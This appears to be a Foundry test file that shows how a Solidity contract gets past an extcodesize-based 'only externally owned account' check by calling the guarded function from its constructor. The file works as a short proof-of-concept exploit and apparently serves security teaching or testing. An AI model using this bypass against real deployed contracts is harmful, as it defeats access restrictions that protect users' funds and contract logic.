// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/SizeCheck.sol";

contract BypassSizeCheck {
    SizeCheck public target;

    constructor(address _target) {
        target = SizeCheck(_target);
        target.onlyEOA(); // Call during contract creation
    }
}

contract SizeCheckTest is Test {
    event Success(address sender);

    SizeCheck public target;

    function setUp() public {
        target = new SizeCheck();
    }

    function testBypassSizeCheck() public {
        // Deploy the attack contract
        vm.expectEmit(true, false, false, false);
        emit Success(address(0)); // Expect Success event
        new BypassSizeCheck(address(target));
    }
}
